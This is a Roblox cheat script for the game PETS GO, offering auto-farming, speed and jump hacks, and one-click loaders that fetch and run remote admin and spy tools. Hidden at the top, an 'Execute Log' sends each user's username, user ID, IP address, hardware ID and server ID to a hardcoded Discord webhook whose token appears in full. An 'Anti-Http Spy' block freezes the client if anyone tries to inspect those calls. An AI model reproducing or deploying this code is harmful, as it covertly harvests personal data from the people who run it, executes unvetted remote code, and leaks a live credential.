-- Anti-Http Spy
task.spawn(function()
    hookfunction(print, function(a) if string.find(a:lower(), "http") then while true do end end end)
    hookfunction(warn, function(a) if string.find(a:lower(), "http") then while true do end end end)
    hookfunction(error, function(a) if string.find(a:lower(), "http") then while true do end end end)
    local oldwrite  oldwrite = hookfunction(writefile, function(file, content)  if(string.find(string.lower(content), 'http') or string.find(string.lower(content), '//') or string.find(string.lower(content), 'https://discord.com/api/webhooks/')) then  while true do end  return end     return oldwrite(file, content) end)
    local oldappend oldappend = hookfunction(appendfile, function(file, content) if(string.find(string.lower(content), 'http') or string.find(string.lower(content), '//') or string.find(string.lower(content), 'https://discord.com/api/webhooks/')) then while true do end return end return oldappend(file, content) end)
    game.DescendantAdded:Connect(function(c) if c and c:IsA('TextLabel') or c:IsA('TextButton') or c:IsA('Message') then if string.find(string.lower(c.Text), 'http') then while true do end c:Destroy() end end end)
    getgenv().rconsoletitle = nil getgenv().rconsoleprint = nil getgenv().rconsolewarn = nil getgenv().rconsoleinfo = nil getgenv().rconsolerr = nil getgenv().clonefunction = function(...) while true do end return end
    game.CoreGui.ChildAdded:Connect(function(c) if(string.lower(c.Name) == 'devconsolemaster') then while true do end c:Destroy() end end)
    local oldNamecall oldNamecall = hookmetamethod(game, '__namecall', newcclosure(function(self, ...) local method = getnamecallmethod()
    if(string.lower(method) == 'rconsoleprint') then while true do end return  end
    if(string.lower(method) == 'rconsoleinfo') then while true do end return end
    if(string.lower(method) == 'rconsolewarn') then while true do end return  end
    if(string.lower(method) == 'rconsoleerr') then while true do end return end
    if(string.lower(method) == 'warn') then while true do end return end
    if(string.lower(method) == 'error') then while true do end return end 
    if(string.lower(method) == 'rendernametag') then while true do end return  end 
    return oldNamecall(self, ...)
    end))
  end)

-- Anti AFK
warn("Anti AFK = Enabled")
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

-- Excute Log
function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = "https://discord.com/api/webhooks/1288935834149453875/s_mbWY-_9-HIwwAFEpm70WCay_dstHJwOa4sTSUGiiCqLPyBuNtE-WkzS8irtOy_NDbF",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "** 🔔 Execute Log Notifaction ✧₊⁺ **",
                ["description"] = nil,
                ["footer"] = {
                            ["text"] = "⏳ Execute Time : "..os.date("%c").."\n 🤝 Project Spectrum 8.0 // Made By xZPUHigh\n 🌟 discord.gg/C3MpUNwsDU 🌎",
                            ["icon_url"] = "https://media.discordapp.net/attachments/1232919765094240266/1288197860159914076/received_6268136009875748.jpg?ex=66f44f3f&is=66f2fdbf&hm=a7781334ae91dc5e7d73d148899c1507365a5daf94114d39bcab27e6378f7694&=&format=webp&width=671&height=671"
                            },
                ["thumbnail"] = {
                            ["url"] = "https://media.discordapp.net/attachments/1232919765094240266/1288197860159914076/0"
                                },
                ["image"] = {
                            ["url"] = "https://media.discordapp.net/attachments/1284397366069297182/1294750491087208578/2165c56bd5dc32879c83adf4a83a0c87.gif?ex=670c25dc&is=670ad45c&hm=d3371e7b34dd6ac5107bb85cd1d796f2da5344063a0b92182c63826291c3b30e&="
                                },
                ["fields"] = {
                    {
                        ["name"] = "**👩🏻‍💼 Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**🔖 User ID**",
                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**📋 Place ID**",
                        ["value"] = "```" .. game.PlaceId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**🌍 IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**📍 Hwid**",
                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**🍻 Job ID**",
                        ["value"] = "```" .. game.JobId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**🌟 Join Code**",
                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
                        ["inline"] = false
                    }
                }
            }
        }
    }
    return AdminMessage
end

PostWebhook("urtl", AdminLoggerMsg())

-- Notify After Excute
local player = game.Players.LocalPlayer

local screenGui = Instance.new("ScreenGui")
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local notificationFrame = Instance.new("Frame")
notificationFrame.Size = UDim2.new(0, 250, 0, 60)
notificationFrame.Position = UDim2.new(0.5, -125, 0, -70)
notificationFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
notificationFrame.BorderSizePixel = 0
notificationFrame.Parent = screenGui

local notificationCorner = Instance.new("UICorner")
notificationCorner.CornerRadius = UDim.new(0, 10)
notificationCorner.Parent = notificationFrame

local messageLabel = Instance.new("TextLabel")
messageLabel.Size = UDim2.new(1, -20, 1, -30)
messageLabel.Position = UDim2.new(0, 10, 0, 10)
messageLabel.Text = "Welcome To Project Spectrum!"
messageLabel.Font = Enum.Font.Gotham
messageLabel.TextSize = 11
messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
messageLabel.BackgroundTransparency = 1
messageLabel.TextWrapped = true
messageLabel.Parent = notificationFrame

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(1, -20, 0, 4)
progressBar.Position = UDim2.new(0, 10, 1, -14)
progressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
progressBar.BorderSizePixel = 0
progressBar.Parent = notificationFrame

local progressBarCorner = Instance.new("UICorner")
progressBarCorner.CornerRadius = UDim.new(0, 2)
progressBarCorner.Parent = progressBar

notificationFrame:TweenPosition(UDim2.new(0.5, -125, 0, 10), Enum.EasingDirection.Out, Enum.EasingStyle.Quint, 0.5, true)

local tweenService = game:GetService("TweenService")
local tweenInfo = TweenInfo.new(5, Enum.EasingStyle.Linear)
local progressBarTween = tweenService:Create(progressBar, tweenInfo, {Size = UDim2.new(0, 0, 0, 4)})
progressBarTween:Play()

wait(5)

notificationFrame:TweenPosition(UDim2.new(0.5, -125, 0, -70), Enum.EasingDirection.In, Enum.EasingStyle.Quint, 0.5, true, function()
    screenGui:Destroy()
end)

-- Credit
wait(.1)
print("Project Spectrum...")
wait(0)
print("Founder/ ZPU {xZPUHigh}")
wait(0)
print("Last Updated 13/10/24")
--[[
	WARNING: This just BETA PROJECT! This script has not been verified by QC. Use at your own risk! {ZPU}
]]
local ThunderScreen = Instance.new("ScreenGui")
local ThunderToggleUI = Instance.new("TextButton")
local ThunderCornerUI = Instance.new("UICorner")
local ThunderImageUI = Instance.new("ImageLabel")

ThunderScreen.Name = "ThunderScreen"
ThunderScreen.Parent = game.CoreGui
ThunderScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

ThunderToggleUI.Name = "ThunderToggleUI"
ThunderToggleUI.Parent = ThunderScreen
ThunderToggleUI.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
ThunderToggleUI.BorderSizePixel = 0
ThunderToggleUI.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
ThunderToggleUI.Size = UDim2.new(0, 50, 0, 50)
ThunderToggleUI.Font = Enum.Font.SourceSans
ThunderToggleUI.Text = ""
ThunderToggleUI.TextColor3 = Color3.fromRGB(0, 0, 0)
ThunderToggleUI.TextSize = 14.000
ThunderToggleUI.Draggable = true
ThunderToggleUI.MouseButton1Click:Connect(
    function()
        game:GetService("VirtualInputManager"):SendKeyEvent(true, "LeftControl", false, game)
        game:GetService("VirtualInputManager"):SendKeyEvent(false, "LeftControl", false, game)
    end
)

ThunderCornerUI.Name = "ThunderCornerUI"
ThunderCornerUI.Parent = ThunderToggleUI

ThunderImageUI.Name = "Project Spectrum"
ThunderImageUI.Parent = ThunderToggleUI
ThunderImageUI.BackgroundColor3 = Color3.fromRGB(111, 0, 255)
ThunderImageUI.BackgroundTransparency = 1.000
ThunderImageUI.BorderSizePixel = 0
ThunderImageUI.Position = UDim2.new(0.0, 0, 0.0, 0)
ThunderImageUI.Size = UDim2.new(0, 50, 0, 50)
ThunderImageUI.Image = "http://www.roblox.com/asset/?id=15568727833"

-- Interface GUI & Function
local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/xZPUHigh/Project-Spectrum/main/Library.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/xZPUHigh/Project-Spectrum/main/Local.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/xZPUHigh/Project-Spectrum/main/Manager.lua"))()
local UserInputService = game:GetService("UserInputService")

local Window = Fluent:CreateWindow({
    Title = "PETS GO! ✨ | Project Spectrum 8.0",
    SubTitle = "by xZPUHigh &  Special Edition               [Leftcontrol]",
    TabWidth = 130,
    Size = UDim2.fromOffset(500, 400),
    Acrylic = true, 
    Transparency = false,
    Theme = "Black",
    MinimizeKey = Enum.KeyCode.LeftControl 
})

local Tabs = {
    Main = Window:AddTab({ Title = "General", Icon = "home" }),
    Script = Window:AddTab({ Title = "Script", Icon = "scroll" }),
     game = Window:AddTab({ Title = "Game", Icon = "usb" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}

local Options = Fluent.Options

do

Tabs.Main:AddSection("Main Features")

Tabs.Main:AddParagraph(
    {
        Title = "Information",
        Content = "you can auto farm with this shit so ez just afk if you enable all function this like auto play :D"
    }
)

local Slider = Tabs.Main:AddSlider("Slider", {
    Title = "Deley Rolls",
    Description = "* Recommend Default Is 1 But 0 Is Better",
    Default = 1, 
    Min = 0,    
    Max = 10,  
    Rounding = 1, 
    Callback = function(Value)
        getgenv().SpeedEggs = Value
    end
})


local Toggle = Tabs.Main:AddToggle("Eggs_RollsValue", {Title = "Auto Rolls [Skip Animation]", Description = "- TEST", Default = false})

Toggle:OnChanged(function()
    getgenv().Eggs_Roll = Options.Eggs_RollsValue.Value

    if getgenv().Eggs_Roll then
        startEggsRollLoop()
    else
        getgenv().Eggs_Roll = false
    end
end)

function startEggsRollLoop()
    spawn(function()
        while getgenv().Eggs_Roll do 
            wait(SpeedEggs)
            game:GetService("ReplicatedStorage").Network.Eggs_Roll:InvokeServer()
        end
    end)
end


local Slider = Tabs.Main:AddSlider("Slider", {
    Title = "Process Upgrades Speed",
    Description = "Increase the speed of process refresh or update rate",    
    Default = 1, 
    Min = 0,    
    Max = 10,  
    Rounding = 1, 
    Callback = function(Value)
        getgenv().SpeedUpgrades = Value
    end
})

local Toggle = Tabs.Main:AddToggle("UpgradesValue", {Title = "Auto Upgrades", Description = "Upgrades must also be open. If you want to specify Upgrades, just click on something and it will be done automatically.", Default = false})

Toggle:OnChanged(function()
    getgenv().Upgrades = Options.UpgradesValue.Value

    if getgenv().Upgrades then
        startUpgradesRollLoop()
    else
        getgenv().Upgrades = false
    end
end)

function startUpgradesRollLoop()
    spawn(function()
        while getgenv().Upgrades do
            local upgradesFolder = workspace:FindFirstChild("__THINGS") and workspace.__THINGS:FindFirstChild("Upgrades") and workspace.__THINGS.Upgrades:FindFirstChild("Upgrades Frontend Render")

            if upgradesFolder then
  

                local function convertShortenedNumber(shortened)
                    if string.find(shortened, "k") then
                        local number = string.gsub(shortened, "k", "")
                        return tonumber(number) * 1000
                    elseif string.find(shortened, "m") then
                        local number = string.gsub(shortened, "m", "")
                        return tonumber(number) * 1000000
                    elseif string.find(shortened, "b") then
                        local number = string.gsub(shortened, "b", "")
                        return tonumber(number) * 1000000000
                    else
                        return tonumber(shortened)
                    end
                end
                
                local lowestPrice = math.huge
                local lowestUpgradeName = nil
                
                for _, upgrade in pairs(upgradesFolder:GetChildren()) do
                    if upgrade:FindFirstChild("Price") and upgrade.Price:FindFirstChild("SurfaceGui") and upgrade.Price.SurfaceGui:FindFirstChild("Price") then
                        local priceLabel = upgrade.Price.SurfaceGui.Price
                        local priceText = convertShortenedNumber(priceLabel.ContentText)
                        
                        if priceText and priceText < lowestPrice then
                            lowestPrice = priceText
                            lowestUpgradeName = upgrade.Name
                        end
                    end
                end
                
                if lowestUpgradeName then
                    local args = {
                        [1] = lowestUpgradeName
                    }
                
                    game:GetService("ReplicatedStorage").Network.Upgrades_Purchase:InvokeServer(unpack(args))
                end
            end

            wait(SpeedUpgrades)
        end
    end)
end


local Toggle = Tabs.Main:AddToggle("orbValue", {Title = "Auto Orbs", Default = false})

Toggle:OnChanged(function()
    getgenv().orbValues = Options.orbValue.Value

    if getgenv().orbValues then
        startorbRollLoop()
    else
        getgenv().orbValues = false
    end
end)

function startorbRollLoop()
    spawn(function()
        while wait() do
                if getgenv().orbValues then
             local orbsFolder = workspace.__THINGS.Orbs

                local orbNumbers = {}
                for _, orb in pairs(orbsFolder:GetChildren()) do
                    table.insert(orbNumbers, orb.Name) 
                end
                
                for _, orbNumber in pairs(orbNumbers) do
                    local args = {
                        [1] = {
                            [1] = tonumber(orbNumber) 
                        }
                    }
                
                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Orbs: Collect"):FireServer(unpack(args))
                
                    local orbToRemove = orbsFolder:FindFirstChild(orbNumber)
                    if orbToRemove then
                        orbToRemove:Destroy()
                    end
                end
                end
            end
        end)
    end

    Tabs.Main:AddSection("Farm")

    local Slider = Tabs.Main:AddSlider("Slider", {
        Title = "Speed Wait Auto Farm Orbs",
        Description = "Adjust the speed at which pets switch between targets during auto farming",
        Default = 1, 
        Min = 0,    
        Max = 10,  
        Rounding = 1, 
        Callback = function(Value)
            getgenv().SpeedAutoFarmOrbs = Value
        end
    })

    local Dropdown = Tabs.Main:AddDropdown("FarmMode", {
        Title = "Farming Mode",
        Values = {"Random", "All Pets Target One"},
        Multi = false,
        Default = 1,
    })
    
    Dropdown:SetValue("Random")
    
    Dropdown:OnChanged(function(Value)
        getgenv().FarmMode = Value
        print("Farming mode changed:", Value)
    end)
    
    local Toggle = Tabs.Main:AddToggle("AutoFarmorbs", {Title = "Auto Farm Orbs", Default = false})

    Toggle:OnChanged(function()
        getgenv().AutoFarmorb = Options.AutoFarmorbs.Value
    
        if getgenv().AutoFarmorb then
            startAutoFarmorbRollLoop()
        else
            getgenv().AutoFarmorb = false
        end
    end)
    
    function startAutoFarmorbRollLoop()
        spawn(function()
            while wait(SpeedAutoFarmOrbs) do
                if getgenv().AutoFarmorb then
                    local petsFolder = workspace.__THINGS.Pets
                    local breakablesFolder = workspace.__THINGS.Breakables
                    
                    local petNames = {}
                    for _, pet in pairs(petsFolder:GetChildren()) do
                        if tonumber(pet.Name) then  
                            table.insert(petNames, pet.Name)
                        end
                    end
                    
                    local breakableNumbers = {}
                    for _, breakable in pairs(breakablesFolder:GetChildren()) do
                        if tonumber(breakable.Name) then  
                            table.insert(breakableNumbers, breakable.Name)
                        end
                    end
    
                    if #petNames == 0 or #breakableNumbers == 0 then
                        print("Waiting for pets or breakables to appear...")
                        repeat
                            wait(1)
                            
                            petNames = {}
                            for _, pet in pairs(petsFolder:GetChildren()) do
                                if tonumber(pet.Name) then  
                                    table.insert(petNames, pet.Name)
                                end
                            end
                            
                            breakableNumbers = {}
                            for _, breakable in pairs(breakablesFolder:GetChildren()) do
                                if tonumber(breakable.Name) then  
                                    table.insert(breakableNumbers, breakable.Name)
                                end
                            end
                        until #petNames > 0 and #breakableNumbers > 0
                    end
    
                    if getgenv().FarmMode == "Random" then
                        for _, petName in ipairs(petNames) do
                            local randomBreakableNumber = breakableNumbers[math.random(#breakableNumbers)]
                            local args = {
                                [1] = {
                                    [petName] = tonumber(randomBreakableNumber)
                                }
                            }
                            game:GetService("ReplicatedStorage").Network.Breakables_JoinPetBulk:FireServer(unpack(args))
                        end
                    elseif getgenv().FarmMode == "All Pets Target One" then
                        local targetBreakableNumber = breakableNumbers[math.random(#breakableNumbers)]
                        for _, petName in ipairs(petNames) do
                            local args = {
                                [1] = {
                                    [petName] = tonumber(targetBreakableNumber)
                                }
                            }
                            game:GetService("ReplicatedStorage").Network.Breakables_JoinPetBulk:FireServer(unpack(args))
                        end
                    end
                end
            end
        end)
    end
    

    Tabs.Main:AddSection("Buy")


    Tabs.Main:AddButton({
        Title = "Potion Vending Machine",
         Callback = function()
            local args = {
                [1] = "PotionVendingMachine"
            }
            
            game:GetService("ReplicatedStorage").Network.VendingMachines_Purchase:InvokeServer(unpack(args))            
        end
    })

    local Toggle = Tabs.Main:AddToggle("PotionVendingMachineValue", {Title = "Auto Potion Vending Machine", Default = false})

Toggle:OnChanged(function()
    getgenv().AutoPotionVendingMachine = Options.PotionVendingMachineValue.Value

    if getgenv().AutoPotionVendingMachine then
        AutoPotionVendingMachineLoop()
    else
        getgenv().AutoPotionVendingMachine = false
    end
end)

function AutoPotionVendingMachineLoop()
    spawn(function()
        while getgenv().AutoPotionVendingMachine do 
            wait(3)
            local args = {
                [1] = "PotionVendingMachine"
            }
            
            game:GetService("ReplicatedStorage").Network.VendingMachines_Purchase:InvokeServer(unpack(args))     
        end
    end)
end



    local contentFolder = game:GetService("Players").LocalPlayer.PlayerGui._MACHINES.CraftingMachine.Frame.UsingFrame.Content

    local minValue = math.huge
    local maxValue = -math.huge
    
    for _, item in pairs(contentFolder:GetChildren()) do
        if tonumber(item.Name) then
            local number = tonumber(item.Name)
            if number < minValue then
                minValue = number 
            end
            if number > maxValue then
                maxValue = number
            end
        end
    end
    
    if minValue == math.huge then
        minValue = 1
    end
    
    if maxValue == -math.huge then
        maxValue = 18 
    end
    
    local Slider = Tabs.Main:AddSlider("Slider", {
        Title = "Number Buy Potion Crafting Machine",
        Description = "The number you want to buy from the Potion Crafting Machine store in numerical order",
        Default = 1,
        Min = minValue, 
        Max = maxValue, 
        Rounding = 1,
        Callback = function(Value)
            getgenv().PotionCraftingMachinenumber = Value
        end
    })

    local function getClosestNumber(target, numbers)
        local closest = numbers[1]  
        for _, num in ipairs(numbers) do
            if math.abs(num - target) < math.abs(closest - target) then
                closest = num  
            end
        end
        return closest
    end
    
    Tabs.Main:AddButton({
        Title = "Potion Crafting Machine",
        Callback = function()
            local potionCraftingMachineNumber = getgenv().PotionCraftingMachinenumber 
            local numbers = {}
    
            for _, item in pairs(contentFolder:GetChildren()) do
                if tonumber(item.Name) then
                    table.insert(numbers, tonumber(item.Name))  
                end
            end
    
         
            local closestNumber = getClosestNumber(potionCraftingMachineNumber, numbers)
    
          
            local args = {
                [1] = "PotionCraftingMachine",
                [2] = closestNumber  
            }
    
            game:GetService("ReplicatedStorage").Network.CraftingMachine_Craft:InvokeServer(unpack(args))               
        end
    })    


-- سكربت جميع مابات

		Tabs.Script:AddSection("player")


    local Slider = Tabs.Script:AddSlider("Slider", {
        Title = "WalkSpeed",
        Description = "Adjust the speed of a personal player",
        Default = 16,
        Min = 0,
        Max = 500,
        Rounding = 1,
        Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
        end
    })

        Tabs.Script:AddButton({
        Title = "Reset WalkSpeed",
        Description = "Reset WalkSpeed normal",
        Callback = function()
            Window:Dialog({
                Title = "Reset WalkSpeed",
                Content = "Are you sure you want to reset the WalkSpeed?",
                Buttons = {
                    {
                        Title = "Confirm",
                        Callback = function()
                   game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
                        end
                    },
                    {
                        Title = "Cancel",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })


    
    local Slider = Tabs.Script:AddSlider("Slider", {
        Title = "JumpPower",
        Description = "Adjust the JumpPower of a personal player",
        Default = 50,
        Min = 0,
        Max = 500,
        Rounding = 1,
        Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
        end
    })

        Tabs.Script:AddButton({
        Title = "Reset JumpPower",
        Description = "Reset JumpPower normal",
        Callback = function()
            Window:Dialog({
                Title = "Reset JumpPower",
                Content = "Are you sure you want to reset the JumpPower?",
                Buttons = {
                    {
                        Title = "Confirm",
                        Callback = function()
                   game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
                        end
                    },
                    {
                        Title = "Cancel",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })


    local Toggle = Tabs.Script:AddToggle("MyToggle", {Title = "InfiniteJump", Default = false})

    Toggle:OnChanged(function()
        getgenv().InfiniteJumpEnabled = Options.MyToggle.Value
    end)
    
    Options.MyToggle:SetValue(false)
    
    local Players = game:GetService("Players")
    local Player = Players.LocalPlayer
    
    UserInputService.JumpRequest:Connect(function()
        if getgenv().InfiniteJumpEnabled then
          
            if Player.Character and Player.Character:FindFirstChildOfClass('Humanoid') then
                local Humanoid = Player.Character:FindFirstChildOfClass('Humanoid')
                Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end)


    local Toggle = Tabs.Script:AddToggle("AntiAFKEnableds", {Title = "Anti AFK", Default = false})

    Toggle:OnChanged(function()
        getgenv().AntiAFKEnabled = Options.AntiAFKEnableds.Value

        if getgenv().AntiAFKEnabled then
            startAntiAFK()
        else
            getgenv().AntiAFKEnabled = false
        end
    end)


    function startAntiAFK()
        spawn(function()
    local VirtualUser = game:service'VirtualUser'
    game:service'Players'.LocalPlayer.Idled:connect(function()
        while getgenv().AntiAFKEnabled do
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
            print("Prevented AFK kick.")
        end
    end)
end)
end




    
    Tabs.Script:AddSection("Script")


    Tabs.Script:AddButton({
        Title = "Infinite Yield",
        Description = "",
        Callback = function()
            Window:Dialog({
                Title = "Infinite Yield",
                Content = "Are you sure you want to activate the script?",
                Buttons = {
                    {
                        Title = "Yes",
                        Callback = function()

                            loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
                                end
                    },
                    {
                        Title = "No",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })

    Tabs.Script:AddButton({
        Title = "fates admin",
        Description = "",
        Callback = function()
            Window:Dialog({
                Title = "fates admin",
                Content = "Are you sure you want to activate the script?",
                Buttons = {
                    {
                        Title = "Yes",
                        Callback = function()

                            loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()
                                        end
                    },
                    {
                        Title = "No",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })

    Tabs.Script:AddButton({
        Title = "Hydroxide",
        Description = "",
        Callback = function()
            Window:Dialog({
                Title = "Hydroxide",
                Content = "Are you sure you want to activate the script?",
                Buttons = {
                    {
                        Title = "Yes",
                        Callback = function()

 local owner = "Upbolt"
local branch = "revision"

local function webImport(file)
    return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
end

webImport("init")
webImport("ui/main")
                                        end
                    },
                    {
                        Title = "No",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })

    Tabs.Script:AddButton({
        Title = "SimpleSpy",
        Description = "",
        Callback = function()
            Window:Dialog({
                Title = "SimpleSpy",
                Content = "Are you sure you want to activate the script?",
                Buttons = {
                    {
                        Title = "Yes",
                        Callback = function()

                            loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
                                        end
                    },
                    {
                        Title = "No",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })

    Tabs.Script:AddButton({
        Title = "Dex V4",
        Description = "",
        Callback = function()
            Window:Dialog({
                Title = "Dex V4",
                Content = "Are you sure you want to activate the script?",
                Buttons = {
                    {
                        Title = "Yes",
                        Callback = function()

                            loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
                                        end
                    },
                    {
                        Title = "No",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })

    Tabs.Script:AddButton({
        Title = "Dex V3",
        Description = "",
        Callback = function()
            Window:Dialog({
                Title = "Dex V3",
                Content = "Are you sure you want to activate the script?",
                Buttons = {
                    {
                        Title = "Yes",
                        Callback = function()

                            loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
                                                end
                    },
                    {
                        Title = "No",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })

-- سكربت لذي موجوده العاب


		Tabs.game:AddSection("Game Works Script")

        Tabs.game:AddParagraph({
            Title = "Important Warning",
            Content = "There are three different status levels for the map:\n🟢 Fully Functional (100%): The script operates perfectly within the map.\n🟠 Partially Functional (50%): The script has a 50% success rate; some commands may or may not work as intended.\n🔴 Non-Functional (0%): The script is not operational; commands are either not executed at all or have an extremely low chance of functioning correctly."
        })

        local api_url = "https://api.github.com/repos/7yd7/Hub/contents/Script?ref=Branch"

        local success, response = pcall(function()
            return request({
                Url = api_url,
                Method = "GET",
                Headers = {
                    ["Content-Type"] = "application/json"
                }
            })
        end)
        
        if success and response.StatusCode == 200 then
            local http = game:GetService("HttpService")
            local data = http:JSONDecode(response.Body)
        
            for _, file in pairs(data) do
                local fullName = file.name
                
                local mapName, mapId, status = fullName:match("^(.-)|(%d+)|(.+)$")
                
                if mapName and mapId and status then
                    mapId = tonumber(mapId) 
        
                    Tabs.game:AddButton({
                        Title = mapName .. " | " .. status,
                        Description = "Game Script",
                        Callback = function()
                            Window:Dialog({
                                Title = "Teleport",
                                Content = "Teleport to game " .. mapName,
                                Buttons = {
                                    {
                                        Title = "Confirm",
                                        Callback = function()
                                            game:GetService("TeleportService"):Teleport(mapId, game:GetService("Players").LocalPlayer)
                                        end
                                    },
                                    {
                                        Title = "Cancel",
                                        Callback = function() end
                                    }
                                }
                            })
                        end
                    })
                else
                    print("Invalid format for file: " .. fullName)
                end
            end
        else
            print("Error fetching data: " .. (response and response.StatusMessage or "Unknown error"))
        end
        

-- نهايه



SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)


SaveManager:IgnoreThemeSettings()

SaveManager:SetIgnoreIndexes({})

Window:SelectTab(1)


SaveManager:LoadAutoloadConfig()


InterfaceManager:SetFolder("FluentScriptHub")
SaveManager:SetFolder("FluentScriptHub/specific-game")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)


Window:SelectTab(1)

SaveManager:LoadAutoloadConfig()

    end
